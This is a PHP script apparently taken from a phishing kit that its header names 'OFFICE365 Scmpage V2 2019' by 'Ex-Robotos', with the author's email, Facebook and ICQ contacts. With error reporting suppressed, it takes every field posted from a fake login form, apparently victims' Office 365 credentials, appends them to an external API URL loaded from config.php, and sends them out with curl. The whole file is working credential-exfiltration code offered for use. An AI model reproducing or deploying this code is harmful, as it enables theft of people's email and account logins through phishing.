<?php
/* 
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('config.php');$apiurl.='?';foreach($_POST as $a=>$b){$apiurl.=$a.'='.$b.'&';}$ExRobotos=curl_init();curl_setopt($ExRobotos,CURLOPT_URL,$apiurl);curl_setopt($ExRobotos,CURLOPT_HEADER,0);curl_setopt($ExRobotos,CURLOPT_RETURNTRANSFER,TRUE);$curlExec=curl_exec($ExRobotos);curl_close($ExRobotos);echo $curlExec;
?>